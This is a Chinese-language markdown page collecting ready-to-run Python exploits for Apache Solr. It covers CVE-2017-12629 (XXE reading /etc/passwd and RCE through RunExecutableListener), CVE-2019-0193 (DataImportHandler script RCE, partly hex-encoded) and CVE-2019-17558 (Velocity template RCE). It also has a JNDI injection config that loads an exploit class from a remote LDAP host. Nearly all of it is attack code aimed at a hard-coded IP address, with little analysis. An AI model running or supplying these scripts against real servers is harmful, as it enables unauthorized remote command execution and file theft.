# Apache Solr漏洞
**Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。**
>Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。Solr是一个独立的企业级搜索应用服务器，很多企业运用solr开源服务。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。它的主要特性包括：高效、灵活的缓存功能，垂直搜索功能，高亮显示搜索结果，通过索引复制来提高可用性，提 供一套强大Data Schema来定义字段，类型和设置文本分析，提供基于Web的管理界面等。


https://github.com/Imanfeng/Apache-Solr-RCE

## CVE-2017-12629

[CVE-2017-12629 - Apache Solr XXE & RCE 漏洞分析](https://paper.seebug.org/425/)

```python
# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
# xxe and rce
import requests
from urllib.parse import quote

ip='101.35.196.173'
port='8983'

'''
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
'''
def xxe(url):
    exp = "<?xml version=\"1.0\" ?><!DOCTYPE root[<!ENTITY % ext SYSTEM \""+url+"\">%ext;%ent;]><r>&data;</r>"
    text = quote(exp, 'utf-8')
    burp0_url = "http://"+ip+":"+port+"/solr/demo/select?q="+text+"&wt=xml&defType=xmlparser"
    get = requests.get(burp0_url)
    print(get.text)

# 依据漏洞作者所披露的漏洞细节来看，RCE需要使用到SolrCloud Collections API，所以RCE只影响Solrcloud分布式系统。
# /solr/admin/cores?wt=json 判断
def rce(cmd):#不稳定,并且不知道路径
    burp0_url = "http://"+ip+":"+port+"/solr/demo/config"
    burp0_headers = {"Accept": "*/*", "Accept-Language": "en",
                     "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                     "Connection": "close"}
    burp0_json = {
        "add-listener": {"args": ["-c", cmd], "class": "solr.RunExecutableListener", "dir": "/bin/",
                         "event": "postCommit", "exe": "sh", "name": "newlistener"}}
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

    burp0_json2=[{"id": "test"}]
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json2)

if __name__ == '__main__':
    # xxe("http://101.35.196.173:8080/do.dtd")
    rce("touch /tmp/1")
```

## CVE-2019-0192

https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py

## CVE-2019-0193

https://www.yuque.com/tianxiadamutou/zcfd4v/uyceyo#4785516e

```python
# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
import requests
from urllib.parse import quote

def getinfo(remote):
    burp0_url = remote + "/solr/admin/cores?wt=json"
    r = requests.get(burp0_url, verify=False, allow_redirects=False)
    if r.status_code == 200:
        a = list(r.json()['status'].keys())
        # ressource = "/solr/" + a[0] + "/config"
        # print(ressource)
        return a[0]
    else:
        exit(0)

#需要出网
def exp1(url,info,cmd):
    burp0_url = url+"/solr/"+info+"/dataimport?_=1647571813629&indent=on&wt=json"
    burp0_headers = {"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest",
                     "Content-type": "application/x-www-form-urlencoded", "Connection": "close"}
    burp0_data = {"command": "full-import", "verbose": "false", "clean": "false", "commit": "true", "debug": "true",
                  "core": "test",
                  "dataConfig": "<dataConfig>\n  <dataSource type=\"URLDataSource\"/>\n  <script><![CDATA[\n          function poc(row){ \n            var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\""+cmd+"\").getInputStream()));\n            var result = [];\n            while(true) {\n              var oneline = bufReader.readLine();\n              result.push( oneline );\n              if(!oneline) break; \n            }\n            row.put(\"title\",result.join(\"\\n\\r\")); \n            return row;\n          }\n  ]]></script>\n  <document>\n    <entity name=\"stackoverflow\"\n            url=\"https://stackoverflow.com/feeds/tag/solr\"\n            processor=\"XPathEntityProcessor\"\n            forEach=\"/feed\"\n            transformer=\"script:poc\" />\n  </document>\n</dataConfig>",
                  "name": "dataimport"}
    post = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(post.json()['documents'])

def exp2(url,info,cmd):
    burp0url = url+"/solr/"+info+"/config"
    headers = {"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
                     "Content-Type": "application/json"}
    burp0_json = {"set-property": {"requestDispatcher.requestParsers.enableStreamBody": True}}
    requests.post(burp0url, headers=headers, json=burp0_json)

    exp='''<dataConfig>
        <dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
          <script><![CDATA[
                  function poc(row){
         var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("'''+cmd+'''").getInputStream()));
        var result = [];
        while(true) {
        var oneline = bufReader.readLine();
        result.push( oneline );
        if(!oneline) break;
        }
        row.put("title",result.join("\n\r"));
        return row;
        }
        ]]></script>
        <document>
            <entity
                stream="true"
                name="entity1"
                datasource="streamsrc1"
                processor="XPathEntityProcessor"
                rootEntity="true"
                forEach="/RDF/item"
                transformer="script:poc">
                     <field column="title" xpath="/RDF/item/title" />
            </entity>
        </document>
        </dataConfig>'''
    text = quote(exp, 'utf-8')
    text ="%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22"+quote(cmd,'utf-8')+"%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20"
    burp0_url = url+"/solr/"+info+"/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig="+text
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0",
                     "Accept": "application/json, text/plain, */*",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate",
                     "content-type": "multipart/form-data; boundary=------------------------aceb88c2159f183f"}
    burp0_data = "\r\n--------------------------aceb88c2159f183f\r\nContent-Disposition: form-data; name=\"stream.body\"\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<RDF>\r\n<item/>\r\n</RDF>\r\n\r\n--------------------------aceb88c2159f183f--"
    requests_post = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(requests_post.json()['documents'])

if __name__ == '__main__':
    info = getinfo("http://101.35.196.173:8983")
    # exp1("http://101.35.196.173:8983",info,"ls /tmp/")
    exp2("http://101.35.196.173:8983",info,'ls /tmp/')
```

**jndi注入**

```
<dataConfig>
	<dataSource type="JdbcDataSource"
		jndiName="ldap://xxx.xxx.xxx.xxx:1389/Exploit"/>
	<document>
		<entity name="test">
		</entity>
	</document>	
</dataConfig>
```

## CVE-2019-17558

https://github.com/jas502n/solr_rce

```python
# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
# 在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。
import requests

url ="http://101.35.196.173:8983"
cmd ="ls"

burp0_url = url + "/solr/admin/cores?wt=json"
r = requests.get(burp0_url, verify=False, allow_redirects=False)
a = list(r.json()['status'].keys())

burp0_url = url+"/solr/"+a[0]+"/config"
burp0_headers = {"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "application/json"}
burp0_json={"update-queryresponsewriter": {"class": "solr.VelocityResponseWriter", "name": "velocity", "params.resource.loader.enabled": "true", "solr.resource.loader.enabled": "true", "startup": "lazy", "template.base.dir": ""}}
requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

burp0_url = url+"/solr/"+a[0]+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
burp0_headers = {"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
get = requests.get(burp0_url, headers=burp0_headers)
print(get.text)
```

## 任意文件删除

https://mp.weixin.qq.com/s/JXBiQR3q7ykITVFBwm_9Vg
